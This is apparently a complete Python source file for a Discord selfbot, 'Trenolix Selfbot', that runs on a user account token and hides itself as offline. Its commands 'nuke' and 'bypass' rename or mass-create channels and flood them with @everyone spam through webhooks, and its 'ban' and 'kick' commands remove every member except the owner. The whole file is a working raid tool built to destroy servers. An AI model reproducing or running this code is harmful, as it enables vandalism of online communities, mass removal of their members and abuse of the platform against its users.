import discord
from discord.ext import commands
import asyncio
from colorama import Fore

token = 'your token here'
msg = '@everyone Trenolix is the best supplier for skids.'
channel_names = 'owned-by-rotat'

intents = discord.Intents.all()
client = commands.Bot(command_prefix='.', intents=intents, self_bot=True)

@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.offline)
    print(f'\n{Fore.BLUE} │{Fore.GREEN} Connected to {client.user}\n{Fore.BLUE} │ {Fore.GREEN} Guilds : {len(client.guilds)}\n{Fore.BLUE} │ {Fore.GREEN} Cached users : {len(client.users)}{Fore.RESET}')

@client.command()
async def bypass(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    
    for channel in guild.channels:
        try:
            await channel.edit(name=channel_names)
            print(f"{Fore.GREEN}Renamed channel: {channel.name}{Fore.RESET}")
        except:
            print(f"{Fore.RED}Couldn't rename channel: {channel.name}{Fore.RESET}")
    
    for channel in guild.text_channels:
        try:
            for i in range(3):
                webhook = await channel.create_webhook(name="RR")
                for j in range(5):
                    await webhook.send(msg)
            print(f"{Fore.GREEN}Spammed webhooks in: {channel.name}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Failed in channel {channel.name}: {e}{Fore.RESET}")
    
    await ctx.send("[+] Server Nuked")

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    
    for i in range(20):
        try:
            channel = await guild.create_text_channel(channel_names)
            for k in range(3):
                webhook = await channel.create_webhook(name="RR")
                for j in range(6):
                    await webhook.send(msg)
            print(f"{Fore.GREEN}Created and spammed channel: {channel.name}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Failed to create channel: {e}{Fore.RESET}")
    
    await ctx.send("[+] Server Nuked")

@client.command()
async def ban(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    tasks = []
    
    for member in guild.members:
        if member != client.user and member != guild.owner:
            tasks.append(member.ban())
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    success = sum(1 for r in results if not isinstance(r, Exception))
    await ctx.send(f"Banned {success} members.")

@client.command()
async def kick(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    tasks = []
    
    for member in guild.members:
        if member != client.user and member != guild.owner:
            tasks.append(member.kick())
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    success = sum(1 for r in results if not isinstance(r, Exception))
    await ctx.send(f"Kicked {success} members.")

@client.command()
async def help(ctx):
    try: await ctx.message.delete()
    except: pass

    embed = discord.Embed(title="Trenolix Selfbot", color=0xFF69B4)
    embed.add_field(name="Prefix", value=".", inline=False)
    embed.add_field(name="nuke", value="Starts nuking process", inline=False)
    embed.add_field(name="ban", value="Bans all members", inline=False)
    embed.add_field(name="kick", value="Kicks all members", inline=False)
    embed.add_field(name="bypass", value="Rename all channels and spams in them", inline=False)
    embed.set_footer(text="Trenolix made this.")

    await ctx.send(embed=embed)

client.run(token, bot=False)
